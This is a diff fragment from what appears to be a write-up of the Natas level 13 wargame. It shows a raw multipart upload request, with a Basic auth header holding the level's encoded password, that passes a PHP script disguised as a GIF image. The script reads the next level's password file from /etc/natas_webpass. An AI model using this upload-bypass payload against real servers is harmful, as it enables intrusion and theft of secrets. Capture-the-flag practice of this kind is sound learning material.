@@ -440,15 +440,14 @@ Authorization: Basic bmF0YXMxMzpqbUxUWTBxaVBaQmJhS2M5MzQxY3FQUVpCSnY3TVFiWQ==
 Connection: close
 Upgrade-Insecure-Requests: 1
 
------------------------------1096181585261691482202228918
 Content-Disposition: form-data; name="MAX_FILE_SIZE"
 
 1000
------------------------------1096181585261691482202228918
+
 Content-Disposition: form-data; name="filename"
 
 yzow7qgsuk.php
------------------------------1096181585261691482202228918
+
 Content-Disposition: form-data; name="uploadedfile"; filename="poof2.phpA.gif"
 Content-Type: image/gif
 
@@ -456,7 +455,7 @@ GIF89a  ò  KMUUUKV\JWd]W         !þU<?php
 $password = file_get_contents('/etc/natas_webpass/natas14');
 echo $password;
 ?> !ù	  ,       8*! $ ;
------------------------------1096181585261691482202228918--
+
 ```
 
 
